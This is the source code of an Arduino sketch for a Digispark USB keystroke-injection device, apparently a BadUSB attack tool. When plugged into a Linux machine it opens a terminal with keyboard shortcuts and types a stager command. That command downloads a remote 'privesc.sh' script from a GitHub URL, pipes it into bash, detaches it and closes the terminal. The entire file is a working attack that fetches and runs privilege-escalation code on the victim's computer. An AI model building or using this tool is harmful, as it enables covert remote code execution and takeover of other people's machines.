#include <Arduino.h>
#include "DigiKeyboard.h"

const char* STAGER_PAYLOAD = "curl -sL https://raw.githubusercontent.com/Kaucrow/good-boy/refs/heads/main/privesc.sh | bash & disown; exit";

void setup() {}

void loop() {
    // Sleep
    //DigiKeyboard.delay(10000);

    // Wait for OS to enumerate the USB device
    DigiKeyboard.delay(3000);

    // Clear lingering key strokes
    DigiKeyboard.sendKeyStroke(0);

    // ==========================================
    // Attempt 1: Ctrl + Alt + T
    // ==========================================
    DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT | MOD_ALT_LEFT);
    DigiKeyboard.delay(1000);

    DigiKeyboard.println(STAGER_PAYLOAD);
    DigiKeyboard.delay(1500);

    // ==========================================
    // Attempt 2: Super + Entel
    // ==========================================
    DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_GUI_LEFT);
    DigiKeyboard.delay(1000);

    DigiKeyboard.println(STAGER_PAYLOAD);
    DigiKeyboard.delay(1500);

    while (true) {
      // Keep the USB connection alive without typing anything else
      DigiKeyboard.delay(1000);
    }
}